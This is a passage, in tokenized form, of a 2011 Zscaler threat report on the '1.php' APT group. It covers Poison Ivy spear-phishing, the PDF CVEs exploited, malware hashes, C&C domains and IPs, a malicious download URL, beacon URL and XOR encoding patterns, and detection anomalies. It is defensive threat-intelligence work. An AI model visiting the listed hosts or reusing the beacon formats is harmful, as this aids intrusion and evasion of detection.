"malicious", "phishing", "email", "regarding", "United", "States", "troop", "deployment", "in", "Afghanistan", "that", "\u201c", "Once", "unzipped", ",", "the", "malware", "is", "a", "Windows", "executable", "with", "an", "SCR", "extension", "that", "is", "identified", "as", "a", "Poison", "Ivy", "RAT", "variant", "."], ["\u201c", "Section", "1", ":", "-Zscaler", "ThreatLabZ", "provides", "a", "malicious", "link", "to", ":"], ["File", "name", ":", "WWW.DREAMLIFES.NET", "/", "Afghanistan", "/", "Afghanistan.zip", "."], ["MD5", ":"], ["052E62513505A25CCFADF900A052709C"], ["Once", "unzipped", ",", "the", "malware", "is", "a", "Windows", "executable", "with", "an", "SCR", "extension", "that", "is", "identified", "as", "a", "Poison", "Ivy", "RAT", "variant", "."], ["Beyond", "simple", "phishing", "attacks", "with", "links", "to", "malware", ",", "the", "Group", "also", "sends", "spearphishing", "emails", "with", "malicious", "PDF", "attachments", "to", "their", "targets", "."], ["For", "example", ",", "the", "SANS", "ISC", "Handler", "\u2019s", "Diary", "drew", "attention", "to", "this", "Group", "\u2019s", "phishing", "campaign", "exploiting", "CVE-2009", "-", "4324", "in", "January", "2010", "."], ["A", "screenshot", "of", "their", "story", "headline", "is", "below", "in", ":"], ["Figure", "1", "SANS", "ISC", "Diary"], ["Headline", "related", "to", "\u201c", "1.php", "\u201d", "malware", "campaign3", "."], ["Figure", "1", "SANS", "ISC", "Diary", "Headline", "related", "to", "\u201c", "1.php", "\u201d", "malware", "campaign", "An", "example", "of", "one", "of", "the", "Poison", "Ivy", "RAT", "payloads", "used", "during", "this", "campaign", "was", ":"], ["File", "name", ":", "SUCHOST.EXE", "dropped", "from", "Request.pdf", "email", "attachment"], ["MD5", ":"], ["B0EECA383A7477EE689EC807B775EBBB", "2", "."], ["http://contagiodump.blogspot.com/2009/12/attack-of-day-poison-ivy-zip-download.html", "3", "."], ["http://isc.sans.edu/diary.html?storyid=7867", "\u00a9", "2011", "Zscaler", "."], ["All", "Rights", "Reserved", "."], ["Page", "5"], ["Alleged", "APT", "Intrusion", "Set", ":", "\u201c", "1.php", "\u201d", "Group"], ["This", "file", "received", "commands", "from", ":", "CECON.FLOWER", "-", "SHOW.ORG", "."], ["More", "recently", ",", "in", "July", "2011", ",", "open", "-", "source", "reports4", "exist", "of", "Poison", "Ivy", "usage", "surrounding", "the", "FLOWER", "-", "SHOW.ORG", "domain", "."], ["This", "incident", "exploited", "PDF", "vulnerabilities", "(", "CVE-2010", "-", "2883", ")", "in", "attached", "spear", "-", "phishing", "emails", "targeting", "experts", "on", "Japan", ",", "China", ",", "Taiwan", "/", "USA", "relationships", "."], ["See", "a", "screenshot", "of", "the", "email", "in", ":", "Figure", "2", "Spear", "-", "phishing", "email", "with", "attachment", "exploiting", "CVE-2010", "-", "2883", "."], ["Figure", "2", "Spear", "-", "phishing", "email", "with", "attachment", "exploiting", "CVE-2010", "-", "2883", "Once", "the", "Poison", "Ivy", "payload", "is", "installed", ",", "it", "frequently", "uses", "a", "unique", "beaconing", "pattern", "to", "communicate", "with", "a", "C&C", "server", "."], ["To", "illustrate", "the", "communication", "sequence", ",", "reference", "the", "Joebox", "sandbox", "report5", "for", "the", "following", "file", ":", "File", "name", ":", "Halloween.scr"], ["MD5", ":", "5B90896127179F0AD2E6628593CDB60D", "4", "."], ["http://contagiodump.blogspot.com/2011/07/jul-13-cve-2010-2883-pdf-meeting-agenda.html", "\u00a9", "2011", "Zscaler", "."], ["All", "Rights", "Reserved", "."], ["Page", "6"], ["Alleged", "APT", "Intrusion", "Set", ":", "\u201c", "1.php", "\u201d", "Group", "\u2022", "Communicates", "with", "C&Cs", ":", "\u2013", "FREE.COFFEELAUCH.COM", "(", "98.126.69.3", ")", "\u2013", "FIREHAPPY.SYTES.NET", "*", "(", "98.126.69.3", ")", "\u2022"], ["Via", "HTTP", "GET", "requests", "to", "the", "path", ":", "/1.php?id=[data1]&id=[data2", "]", "&", "id=[data3]&id=[data4]&id=&id=", "\u2013", "2.php", ",", "3.php", ",", "and", "4.php", "with", "i", "d", "parameters", "and", "some", "with", "an", "ending", "&", "Done"], ["have", "also", "been", "observed", "\u2013", "The", "data", "parameters", "are", "information", "about", "the", "infected", "host", "(", "IP", ",", "hostname", ",", "MAC", "address", ",", "username", ",", "and", "OS", "/", "system", "version", ")", "that", "have", "been", "base64", "encoded", "and", "then", "XORed", "."], ["XOR", "keys", "of", "0x3C", "and", "0x3E", "have", "been", "observed", "."], ["An", "asterisk", "following", "a", "domain", "will", "designate", "No", "-", "IP6", "dynamic", "DNS", "\u201c", "The", "\u201c", "1.php?=", "\u201d", "HTTP", "GET", "request", "for", "the", "initial", "C&C", "checkin", "has", "been", "identified", "in", "the", "majority", "of", "past", "incidents", "involving", "this", "Group", "and", "is", "the", "reason", "for", "the", "informal", "\u201c", "1.php", "\u201d", "name", "used", "to", "describe", "this", "intrusion", "set", "."], ["\u201c", "This", "report", "shows", "that", "once", "infected", ",", "the", "victim", ":", "-Zscaler", "ThreatLabZ", "domains", "in", "this", "report", "."], ["Dynamic", "DNS", "is", "a", "service", "that", "provides", "free", ",", "cheap", "flexible", "domain", "hostname", "to", "IP", "address", "resolution", "and", "No", "-", "IP", "is", "one", "of", "the", "many", "vendors", "in", "this", "space", "."], ["While", "the", "malware", "variants", "used", "are", "generally", "referred", "to", "as", "Poison"], ["Ivy", "variants", ",", "there", "are", "many", "cases", "of", "them", "being", "detected", "/", "labeled", "as", "a", "generic", "Trojan", ",", "Backdoor", ",", "or", "something", "else", "entirely", "."], ["For", "example", ",", "in", "a", "December", "2009", "malware", "report", "Kaspersky", "lists", "one", "variant", "as", "Trojan", "."], ["Win32.Buzus.cvdu7", "and", "in", "June", "2010", "another", "as", "Trojan", ".", "Win32.Agent", ".", "eevf8", "."], ["Note", "the", "\u201c", "1.php?id=", "\u201d", "HTTP", "GET", "request", "for", "the", "initial", "C&C", "check", "-", "in", "."], ["This", "specific", "behavior", "has", "been", "identified", "in", "the", "vast", "majority", "of", "past", "incidents", "involving", "this", "Group", "and", "is", "reason", "for", "the", "informal", "\u201c", "1.php", "\u201d", "name", "used", "to", "describe", "these", "intrusion", "sets", "within", "the", "report", "."], ["More", "information", "may", "be", "garnered", "from", "the", "open", "-", "source", "community", ",", "but", "the", "above", "should", "be", "a", "sufficient", "introduction", "into", "the", "tactics", ",", "techniques", ",", "and", "procedures", "(", "TTPs", ")", "of", "this", "Group", "."], ["5", "."], ["http://support.clean-mx.de/clean-mx/view_joebox.php?md5=9339bb2af4d8c07e63051d0f120530e1&id=679603", "6", "."], ["http://www.no-ip.com/services/managed_dns/free_dynamic_dns.html", "7", "."], ["http://www.securelist.com/en/descriptions/7383071/Trojan.Win32.Buzus.cvdu", "8", "."], ["http://www.securelist.com/en/descriptions/7854148/Trojan.Win32.Agent.eevf", "\u00a9", "2011", "Zscaler", "."], ["All", "Rights", "Reserved", "."], ["Page", "7"], ["Alleged", "APT", "Intrusion", "Set", ":", "\u201c", "1.php", "\u201d", "Group", "Zscaler", "has", "observed", "on", "-", "going", "attacks", "from", "June", "2010", "to", "present", ",", "involving", "a", "Cleared", "Defense", "Contractor", "."], ["Given", "the", "entity", "involved", "and", "the", "characteristics", "of", "the", "traffic", "observed", ",", "Zscaler", "believes", "that", "the", "attack", "is", "directly", "related", "to", "the", "\u201c", "1.php", "\u201d", "Group", "."], ["While", "these", "attacks", "appear", "related", "to", "the", "\u201c", "1.php", "\u201d", "Group", ",", "the", "beacons", "do", "not", "bear", "the", "previously", "mentioned", "\u201c", "1.php", "\u201d", "HTTP", "path", "."], ["However", ",", "there", "are", "many", "similarities", "regarding", "these", "\u201c", "new", "\u201d", "beacons", "as", "well", "as", "direct", "relationships", "regarding", "previously", "\u201c", "Zscaler", "believes", "that", "ongoing", "attacks", "against", "a", "sensitive", "customer", "are", "directly", "related", "to", "the", "\u201c", "1.php", "\u201d", "Group", "."], ["\u201c", "Section", "2", ":", "Customer", "Infection", "Behavior", "-Zscaler", "ThreatLabZ", "identified", "domains", "and", "IPs", "used", "by", "the", "\u201c", "1.php", "\u201d", "group", "."], ["Presumably", ",", "these", "\u201c", "new", "\u201d", "beacon", "behaviors", "have", "been", "altered", "to", "evade", "any", "signatures", "designed", "to", "detect", "the", "previous", "\u201c", "1.php", "\u201d", "beaconing", "behavior", "."], ["2.1", "GET", "Beacons", "with", "Modified", "XOR", "Parameters"], ["One", "of", "the", "first", "variations", "that", "we", "noticed", "in", "the", "attacks", ",", "was", "that", "the", "infected", "hosts", "sent", "HTTP", "GET", "request", "check", "-", "ins", "to", "URLs", "with", "the", "general", "pattern", "of", ":", "FQDN", "/", "css.ashx?sc=[data1]&sp=[data2]&ad=[data3]&dh=[data4]&mr=[d", "ata5]&tk="], ["The", "data", "parameters", "contained", "the", "same", "victim", "information", "as", "mentioned", "in", "the", "\u201c", "1.php", "\u201d", "beacons", "and", "were", "also", "base64", "encoded", "and", "XORed", "with", "a", "key", "."], ["Examples", "of", "C&Cs", "that", "we", "observed", "for", "this", "particular", "check", "-", "in", "variant", "include", ":", "\u2022"], ["\u2022", "\u2022", "\u2022"], ["\u2022", "\u2022", "HOUSE.SUPERDOGDREAM.COM"], ["HOME.ALLMYDEARFRIENDS.COM"], ["GOOGLETIME.SERVEIRC.COM"], ["*"], ["INFO.SPORTGAMEINFO.COM"], ["PEOPLE.ENJOYHOLIDAYS.NET"], ["PEARHOST.SERVEHALFLIFE.COM", "*"], ["(", "June", "2010", "\u2013", "1st", "C&C", "observed", "in", "infection", ")"], ["\u00a9", "2011", "Zscaler", "."], ["All", "Rights", "Reserved", "."], ["Page", "8"], ["Alleged", "APT", "Intrusion", "Set", ":", "\u201c", "1.php", "\u201d", "Group", "The", "next", "variation", "that", "we", "noticed", "in", "attacks", ",", "involved", "the", "infected", "hosts", "sending", "HTTP", "GET", "request", "check", "-", "ins", "to", "URLs", "with", "the", "general", "pattern", "of", ":", "FQDN/[data1]/[data2]/[data3]/[data4]/[data5", "]"], ["The", "data", "did", "not", "appear", "to", "be", "XORed", "in", "the", "same", "manner", "as", "the", "beacons", "that", "were", "previously", "identified", "."], ["However", ",", "based", "on", "size", "and", "number", "of", "data", "blocks", ",", "it", "appears", "that", "the", "beacons", "contain", "similar", "information", "from", "the", "victims", "."], ["Examples", "of", "C&Cs", "used", "in", "this", "infection", "variant", "include", ":", "\u2022"], ["\u2022", "\u2022", "\u2022", "\u2022"], ["\u2022", "\u2022"], ["SATELLITE.QUICKSEARCHMOVIE.COM"], ["WWW.TOYHOPING.COM"], ["WORK.FREETHROWLINE.NET", "SEA.ANIMALFANS.NET", "WWW.SEARCHSEA.NET"], ["LOVE.ANIMALFANS.NET", "WWW.JOBCALL.ORG", "\u201c", "\u2026", "it", "is", "currently", "believed", "that", "the", "infection", "point", "was", "through", "malicious", "email", "attachments", "(", "as", "was", "the", "case", "in", "many", "of", "the", "\u201c", "1.php", "\u201d", "OSINT", "incidents", ")", "."], ["\u201c", "2.2", "GET", "Beacons", "with", "Data", "moved", "to", "URL", "path", "-Zscaler", "ThreatLabZ", "2.3", "HTTPS", "CONNECTs", "to", "C&Cs"], ["The", "latest", "variations", "on", "these", "attacks", "are", "related", "to", "customer", "infections", "beginning", "on", "August", "3", ",", "2011", "."], ["Prior", "to", "infection", "for", "this", "incident", ",", "as", "well", "as", "the", "previous", "ones", "listed", ",", "web", "transaction", "logs", "did", "not", "provide", "any", "strong", "evidence", "of", "the", "infection", "point"], ["\u2013", "it", "is", "currently", "believed", "that", "the", "infection", "point", "was", "through", "malicious", "email", "attachments", "(", "as", "was", "the", "case", "in", "many", "of", "the", "\u201c", "1.php", "\u201d", "OSINT", "incidents", ")", "."], ["Following", "infection", ",", "many", "web", "transactions", "were", "witnessed", "each", "hour", "to", "the", "C&C", "servers", "via", "HTTPS", "with", "the", "following", "behaviors", ":"], ["\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "CONNECT", "on", "port", "443", "/", "TCP", "with", "200", "HTTP", "response", "code", "HTTP", "request", "version", "1.0", "with", "HTTP", "response", "version", "1.1"], ["Request", "size", "for", "\u201c", "keep", "-", "alive", "\u201d", "beacons", "were", "primarily", "227", "\u2013", "228", "bytes", "Response", "size", "is", "most", "commonly", "between", "969", "\u2013", "990", "bytes", "Microsoft", "Internet", "Explorer", "6.0", "user", "-", "agent", "string", "(", "hard", "-", "coded", "into", "malware", ",", "as", "this", "is", "not", "a", "standard", "browser", "for", "this", "customer", ")", "\u00a9", "2011", "Zscaler", "."], ["All", "Rights", "Reserved", "."], ["Page", "9"], ["Alleged", "APT", "Intrusion", "Set", ":", "\u201c", "1.php", "\u201d", "Group", "Examples", "of", "C&Cs", "used", "in", "this", "infection", "variant", "include", ":", "\u2022", "\u2022"], ["\u2022", "\u2022"], ["\u2022", "\u2022", "WWW.SAVAGECOUNTY.NET"], ["LOOK.CAPTAINSABERTOOTH.NET", "GEOINFO.SERVEHTTP.COM", "*"], ["ROSE.OFFICESKYLINE.COM", "WWW.CAREERCHALLENGES.NET", "OFFER.AMERICAMS.N", "Section", "3", ":", "Incident", "Inter", "-", "Relationships"], ["There", "are", "a", "number", "of", "domains", "and", "IP", "addresses", "that", "have", "been", "tied", "to", "the", "previously", "mentioned", "incidents", "."], ["Toward", "the", "beginning", "of", "the", "report"], ["it", "was", "stated", "that", "we", "believed", "all", "of", "these", "incidents", "to", "be", "related", "."], ["As", "has", "already", "been", "seen", ",", "there", "are", "some", "similarities", "across", "the", "incidents", ",", "such", "as", "same", "victim", "organization", ",", "similar", "beaconing", "data", "blocks", ",", "and", "infection", "believed", "to", "be", "from", "malicious", "email", "attachments", "."], ["However", ",", "the", "strongest", "evidence", "for", "their", "relationship", "is", "the", "fact", "that", "related", "domains", "and", "IPs", "are", "used", "for", "C&Cs", "across", "these", "incidents", "."], ["\u00a9", "2011", "Zscaler", "."], ["All", "Rights", "Reserved", "."], ["Page", "10"], ["Alleged", "APT", "Intrusion", "Set", ":", "\u201c", "1.php", "\u201d", "Group"], ["The", "following", "Figure", "3", "-", "Link", "-", "Graph", "of", "\u201c", "1.php", "\u201d", "Incident", "Inter", "-", "Relationship", "provides", "this", "illustration", "with", "only", "a", "small", "snippet", "of", "information", "from", "these", "incidents", ":"], ["DOMAIN", "firehappy.sytes.net", "OSINT", "\u201c", "1.php", "\u201d", "Incidents", "coffeelaunch.com", "HOSTNAME"], ["IP", "RESOLUTION", "free", "image", "98.126.69.3", "dreamlifes.net", "tastfine"], ["Zhang", ",", "Yao", "hua", "\u201d"], ["Registration", "details", "ICP100.net", "nmaeservers", "seablow.net", "superdogdream.com", "house", "allmydearfriends.com", "do", ":", "2.1", "Incidents", "sportgameinfo.com", "enjoyholidays.net", "2.2", "Incidents", "jobcall.org", "geoinfo.servehttp.com", "dream", "smart", "178.63.130.197", "rose", "2.3", "Incidents", "46.4.209.130"], ["officeskyline.com", "qinetiq", "captainsabertooth.net", "qnao", "savagecounty.net", "Example", "of", "Possible", "Victim", "Names", "look", "Figure", "3", "-", "Link", "-", "Graph", "of", "\u201c", "1.php", "\u201d", "Incident", "Inter", "-", "Relationship", "\u00a9", "2011", "Zscaler", "."], ["All", "Rights", "Reserved", "."], ["www", "Page", "11"], ["Alleged", "APT", "Intrusion", "Set", ":", "\u201c", "1.php", "\u201d", "Group", "Past", "experience", "with", "APT", "-", "style", "incidents", "show", "that", "hostnames", "may", "be", "used", "to", "identify", "the", "C&C", "for", "particular", "victims", "of", "interest", "."], ["For", "example", ",", "in", "bakerhughes.thruthere.net9", "was", "a", "C&C", "used", "against", "Baker", "Hughes", "in", "the", "disclosed", "Night", "Dragon10", "attacks", "."], ["There", "have", "been", "a", "number", "of", "interesting", "hostnames", "used", "with", "\u201c", "1.php", "\u201d", "C&C", "domains", "that", "may", "indicate", "other", "potential", "victims", "."], ["These", "hostnames", "potentially", "identify", "victims", "within", "the", "US", "Government", "(", "USG", ")", ",", "Defense", "Industrial", "Base", "(", "DIB", ")", ",", "and", "Geospatial", "industry", "."], ["The", "above", "link", "-", "graph", "provides", "one", "example", "of", "such", "an", "entity", "that", "has", "information", "about", "its", "attacks", "already", "disclosed", "in", "\u201c", "There", "have", "been", "a", "number", "of", "interesting", "hostnames", "used", "with", "\u201c", "1.php", "\u201d", "C&C", "domains", "that", "may", "include", "other", "potential", "victims", "."], ["\u201c", "3.1", "Possible", "Relationship", "to", "Other", "APT", "Incidents", "-Zscaler", "ThreatLabZ", "the", "open", "-", "source", "(", "QinetiQ", ")", "."], ["\u201c", "QINETIQ", "\u201d", "or", "\u201c", "QNAO", "\u201d", "(", "QinetiQ", "North", "America", "Operations", ")", "for", "example", ",", "was", "an", "HBGary", "customer", "."], ["HBGary", "supported", "QinetiQ", "in", "detection", "and", "analysis", "of", "on", "-", "going", "targeted", "attacks", "against", "them", "."], ["Following", "the", "Anonymous", "compromise", "and", "leakage", "of", "HBGary", "information", ",", "there", "is", "significant", "information", "in", "the", "public", "domain", "regarding", "the", "attacks", "against", "QinetiQ.", "One", "such", "example", "is", "HBGary", "\u2019s", "Incident", "Response", "Technical", "Report", "Supplement", "for", "QinetiQ11", "."], ["Page", "8", "of", "that", "report", ",", "in", "the", "\u201c", "History", "of", "the", "strain", "\u201d", "section", "states", ":", "HBGary", "has", "code", "-", "named", "this", "threat", "group", "as", "\u201c", "Soysauce", "\u201d", "."], ["This", "group", "is", "also", "known", "as", "\u201c", "Comment", "Crew", "\u201d", "by", "some", ",", "and", "also", "as", "\u201c", "GIF89a", "\u201d", "by", "some", "."], ["The", "choice", "of", "codename", "is", "completely", "arbitrary", "in", "this", "context", "and", "is", "simply", "meant", "to", "identify", "a", "group", "of", "Chinese", "hackers", "who", "have", "a", "consistent", "agenda", "to", "target", "the", "defense", "industrial", "complex", "."], ["The", "name", "\u201c", "Comment", "Crew", "\u201d", "and", "\u201c", "GIF89a", "\u201d", "has", "been", "used", "by", "researchers", "because", "of", "the", "behavior", "of", "this", "group", "to", "enclose", "C&C", "commands", "within", "comments", "on", "HTML", "pages", "or", "hidden", "within", "image", "files", ",", "a", "technique", "known", "as", "steganography", "."], ["These", "indicators", "have", "not", "been", "witnessed", "in", "the", "attacks", "previously", "listed", "in", "this", "report", "."], ["Beyond", "a", "likely", "QinetiQ", "attack", "relation", ",", "there", "are", "a", "number", "of", "other", "hostnames", "that", "indicate", "potential", "attack", "targets", "of", "the", "\u201c", "1.php", "\u201d", "Group", "."], ["Disclosure", "of", "other", "possible", "victim", "names", "is", "intentionally", "omitted", "from", "this", "report", "."], ["9", "."], ["http://hbgary.anonleaks.ch/greg_hbgary_com/2505.html", "10", "."], ["http://www.mcafee.com/in/resources/white-papers/wp-global-energy-cyberattacks-night-dragon.pdf", "11", "."], ["http://publicintelligence.info/HBGary-QinetiQ.pdf", "\u00a9", "2011", "Zscaler", "."], ["All", "Rights", "Reserved", "."], ["Page", "12"], ["Alleged", "APT", "Intrusion", "Set", ":", "\u201c", "1.php", "\u201d", "Group", "Section", "4", ":"], ["Lessons", "Learned"], ["A", "number", "of", "lessons", "can", "be", "learned", "from", "analyzing", "incidents", "within", "this", "intrusion", "set", "."], ["In", "the", "following", "section", ",", "we", "will", "discuss", "analytical", "techniques", "that", "enterprises", "should", "be", "adopting", ",", "in", "order", "to", "uncover", "similar", "attacks", "on", "their", "organizations", "."], ["4.1", "Conduct", "logging", "and", "analytics", "within", "your", "environment"], ["This", "report", "shows", "an", "evolution", "of", "the", "beaconing", "behavior", "from", "the", "\u201c", "1.php", "\u201d", "Group", "."], ["Relying", "solely", "on", "existing", "signatures", "of", "known", "threats", "would", "not", "have", "triggered", "detections", "."], ["By", "identifying", "transactions", "that", "are", "anomalous", ",", "it", "is", "possible", "to", "detect", "previous", "or", "recurring", "incidents", ",", "such", "as", "those", "identified", "above", "."], ["Some", "of", "the", "anomalies", ",", "which", "led", "to", "the", "findings", "in", "this", "report", ",", "include", ":", "\u2022", "HTTP", "version", "1.0", "requests", "with", "version", "1.1", "responses", "\u2022", "Numerous", "transactions", "to", "an", "unknown", "/", "uncategorized", "domain"], ["\u2013"], ["Some", "of", "these", "transactions", "were", "to", "No", "-", "IP", "dynamic", "DNS", "domains", "\u2022", "Blocking", "or", "heavily", "monitoring", "the", "communication", "to", "dynamic", "DNS", "domains", "is", "recommended", "\u2013", "Some", "of", "these", "domains", "were", "parked", "\u2013", "Transactions", "occur", "during", "non", "-", "standard", "times", "(", "nights", "/", "weekends", ")"], ["\u2013", "Some", "transactions", "(", "in", "particular", "the", "GET", "beacons", ")", "had", "a", "larger", "request", "size", "than", "response", "size", "\u2022", "Microsoft", "IE", "6", "user", "-", "agent", "(", "UA", ")", "string", "usage", "in", "an", "environment", "that", "does", "not", "typically", "use", "this", "UA", "\u00a9", "2011", "Zscaler", "."], ["All", "Rights", "Reserved", "."], ["Page", "13"], ["Alleged", "APT", "Intrusion", "Set", ":", "\u201c", "1.php", "\u201d", "Group", "By", "leveraging", "data", "sources", "such", "as", "passive", "DNS", ",", "domain", "registration", "information", ",", "other", "open", "-", "source", "reports", ",", "and", "other", "research", "-", "it", "is", "possible", "to", "derive", "information", "about", "probable", "domains", "and", "infrastructure", "used", ",", "in", "other", "attacks", "by", "the", "same", "group", "of", "attackers", "."], ["In", "some", "cases", ",", "this", "information", "may", "provide", "indicators", "as", "to", "the", "targets", "or", "purpose", "of", "the", "attacks", "."], ["It", "should", "also", "be", "noted", "that", "making", "too", "many", "assumptions", "or", "believing", "unverified", "indicators", "as", "fact", "can", "lead", "to", "misleading", "information", "."], ["Anyone", "can", "set", "a", "hostname", "for", "a", "C&C", "to", "be", "\u201c", "QINETIQ", "\u201d", "for", "example", "."], ["However", ",", "by", "correlating", "these", "domains", "with", "a", "group", "that", "has", "been", "identified", "as", "being", "involved", "in", "APT", "attacks", ",", "provides", "a", "stronger", "indication", "into", "their", "possible", "target", "."], ["\u201c", "While", "the", "exploitation", "used", "in", "some", "of", "the", "crafted", "PDF", "attachments", "may", "be", "considered", "advanced", ",", "for", "the", "most", "part", "the", "attack", "is", "one", "of", "social", "-", "engineering", "."], ["\u201c", "4.2", "Correlate", "with", "other", "sources", "-Zscaler", "ThreatLabZ", "4.3", "APTs", "are", "not", "always", "that", "\u2018", "Advanced", "\u2019"], ["The", "above", "incident", "reports", "document", "(", "spear-", ")", "phishing", "with", "a", "malicious", "PDF", "attachment", ",", "or", "link", "to", "a", "binary", "executable", "with", "a", "Poison", "Ivy", "RAT", "payload", "."], ["While", "the", "exploitation", "used", "in", "some", "of", "the", "crafted", "PDF", "attachments", "may", "be", "considered", "advanced", ",", "for", "the", "most", "part", "the", "attack", "is", "one", "of", "social", "-", "engineering", "."], ["This", "is", "nothing", "new", "and", "something", "that", "other", "fraudsters", "/", "criminals", "have", "been", "leveraging", "for", "many", "years", "."], ["RSA", "recently", "wrapped", "up", "their", "APT", "summit", "and", "their", "first", "finding", "concluded", "that", "the", "\u201c", "attack", "vector", "[", "is", "]", "shifting", "from", "technology", "to", "people\u201d.12", "4.4", "APTs", "are", "not", "limited", "to", "the", "United", "States", "Government", "or", "Defense", "Industrial", "Base"], ["The", "victim", "related", "to", "this", "report", "is", "neither", "a", "Government", "agency", ",", "nor", "an", "entity", "that", "would", "normally", "be", "associated", "with", "the", "Defense", "Industrial", "Base", "."], ["While", "this", "report", "does", "list", "USG", "(", "United", "State", "Government", ")", "and", "DIB", "(", "Defense", "Industrial", "Base", ")", "entities", "as", "possible", "victims", ",", "there", "are", "many", "more", "commercial", "entities", "within", "the", "Geospatial", "and", "Telecommunication", "industries", "that", "appear", "to", "have", "been", "victims", "of", "this", "Group", "."], ["Zscaler", "has", "noted", "both", "foreign", "and", "domestic", "entities", "that", "have", "been", "victims", "of", "other", "APT", "incidents", "as", "well", "."], ["12", "."], ["http://www.rsa.com/summitresults", "\u00a9", "2011", "Zscaler", "."], ["All", "Rights", "Reserved", "."], ["Page", "14"], ["Alleged", "APT", "Intrusion", "Set", ":", "\u201c", "1.php", "\u201d", "Group", "4.5", "APT", "Information", "Disclosure", "Remains", "a", "Challenge", "Incident", "Information", "Disclosure", "is", "an", "extension", "to", "the", "heated", "debate", "around", "vulnerability", "information", "disclosure", ",", "and", "full", "-", "disclosure", "versus", "responsible", "-", "disclosure", "."], ["Responsible", "-", "disclosure", "is", "fairly", "well", "defined", "and", "adopted", "within", "the", "vulnerability", "space", ",", "but", "it", "is", "not", "within", "the", "incident", "space", "."], ["Here", "are", "some", "arguments", "for", "\u201c", "full", "disclosure", "\u201d", "of", "incident", "information", ":", "\u2022", "A", "larger", "community", "of", "awareness", "(", "and", "thus", "potential", "detection", "possibility", ")", ",", "particularly", "if", "there", "are", "more", "organizations", "impacted"], ["\u2022", "A", "general", "philosophy", "that", "information", "should", "be", "public", "and", "that", "the", "Government", "or", "information", "security", "community", "should", "not", "have", "secrets", "kept", "from", "the", "public"], ["\u2022"], ["The", "public", "should", "be", "made", "aware", "of", "which", "organizations", "have", "been", "victimized", "so", "that", "this", "information", "and", "their", "response", "can", "be", "weighed", "before", "trusting", "them", "again", "in", "the", "future"], ["Here", "are", "some", "arguments", "for", "\u201c", "responsible", "disclosure", "\u201d", "(", "the", "selective", "release", "of", "information", "to", "specific", "parties", ")", "of", "incident", "information"], ["\u2022"], ["Public", "release", "will", "cause", "the", "attacker", "to", "alter", "their", "TTPs", "and", "possibly", "allow", "them", "to", "make", "changes", "to", "infected", "systems", "prior", "to", "incident", "response", "action", ",", "making", "detection", "more", "difficult"], ["\u2022", "Public", "release", "of", "information", "can", "be", "viewed", "as", "attempting", "to", "garner"], ["the", "spotlight", "for", "financial", "motives", "versus", "genuine", "concerns", "about", "security"], ["\u2022", "There", "may", "be", "law", "enforcement", "(", "or", "other", ")", "investigations", "that", "are", "on", "-", "going", "and", "such", "a", "release", "of", "information", "could", "compromise", "the", "investigation"], ["Zscaler", "adheres", "to", "the", "following", "general", "principals", "for", "incident/", "vulnerability", "disclosure", ":", "\u2022"], ["Customer", "specific", "information", "is", "disclosed", "only", "to", "the", "impacted", "customer", "\u00a9", "2011", "Zscaler", "."], ["All", "Rights", "Reserved", "."], ["Page", "15"], ["Alleged", "APT", "Intrusion", "Set", ":", "\u201c", "1.php", "\u201d", "Group", "\u2022", "Customer", "information", "will", "be", "redacted", "prior", "to", "public", "disclosure", "or", "disclosure", "to", "other", "impacted", "parties", ",", "stake", "-", "holders", ",", "and", "trusted", "groups", "within", "the", "information", "security", "community", "\u2022"], ["Public", "disclosure", "will", "provide", "high", "-", "level", "indicators", "of", "compromise", "(", "such", "as", "general", "network", "behavior", "and", "malicious", "domains", ")", "without", "the", "release", "of", "specifics", "as", "to", "which", "organizations", "were", "impacted", "and", "is", "done", "so", "when", "it", "is", "believed", "that", "such", "information", "will", "benefit", "others", "in", "protecting", "against", "similar", "threats"], ["\u2022"], ["Based", "on", "feedback", "/", "approval", "from", "the", "impacted", "parties", ",", "stake", "-", "holders", ",", "and", "information", "security", "community", "\u2013", "additional", "information", "may", "be", "released", "to", "the", "public"], ["Zscaler", "is", "willing", "to", "share", "additional", "details", "of", "the", "incidents", "discussed", "in", "this", "report", "with", "trusted", "groups", "within", "the", "information", "security", "community", "to", "help", "further", "their", "research", "with", "regard", "to", "similar", "incidents", "."], ["If", "you", "are", "interested", "in", "sharing", "data", "on", "this", "and", "other", "incidents", ",", "we", "encourage", "you", "to", "contact", "us", "at", "threatlabz@zscaler.com", "."], ["Conclusion"], ["By", "interrogating", "Zscaler", "\u2019s", "comprehensive", "logging", "repository", "for", "anomalous", "activity", "and", "indicators", "of", "compromise", ",", "a", "Zscaler", "ThreatLabZ", "researcher", "identified", "a", "high", "-", "risk", "entity", "victimized", "by", "a", "possible", "APT", "attack", "linked", "to", "the", "\u201c", "1.php", "\u201d", "Group", "."], ["The", "conclusion", "that", "these", "attacks", "should", "be", "classified", "as", "an", "APT", "attack", "are", "based", "on", "the", "following", "indicators", ":", "\u2022"], ["The", "victim", "enterprise", "is", "a", "high", "risk", "target", ",", "involved", "in", "an", "industry", "that", "has", "regularly", "been", "targeted", "in", "similar", "attacks", "\u2022"], ["Linkages", "were", "identified", "among", "several", "previous", "incidents", "from", "2010", "to", "present", ",", "showing", "persistence"], ["\u2022", "There", "remains", "little", "to", "no", "open", "-", "source", "information", "on", "the", "domains", "/"], ["IPs", "used", "in", "the", "attack", ",", "and", "the", "linkage", "to", "open", "-", "source", "reports", "shows", "a", "correlation", "with", "past", "APT", "incidents", "\u00a9", "2011", "Zscaler", "."], ["All", "Rights", "Reserved", "."], ["Page", "16"], ["Alleged", "APT", "Intrusion", "Set", ":", "\u201c", "1.php", "\u201d", "Group", "APT", "incidents", "\u2022"], ["Some", "No", "-", "IP", "dynamic", "DNS", "domains", "used", "(", "while", "a", "weak", "APT", "indicator", ",", "dynamic", "DNS", "domains", "have", "often", "been", "used", "among", "documented", "APT", "incidents", ",", "such", "as", "Aurora", "and", "Night", "Dragon", ")"], ["\u2022"], ["Hostnames", "related", "to", "victims", "are", "used", ",", "which", "is", "a", "technique", "previously", "documented", "in", "other", "APT", "attacks", "\u2022", "Nameserver", "and", "domain", "registration", "information", "indicates", "likely", "Chinese", "origin", "of", "attacks", "\u2022", "VPS", "/", "hosting", "servers", "used", "match", "some", "of", "those", "previously", "used", "in", "alleged", "APT", "attacks", "."], ["The", "sum", "of", "these", "indicators", "has", "led", "to", "our", "conclusion", "that", "this", "was", "\u201c", "The", "sum", "of", "these", "indicators", "has", "led", "to", "our", "conclusion", "that", "this", "was", "an", "attack", "performed", "over", "a", "significant", "period", "of", "time", "that", "focused", "on", "a", "specific", "target", ",", "given", "the", "sensitive", "nature", "of", "their", "work", "."], ["\u201c", "\u2022", "The", "RAT", "payload", "in", "question", "is", 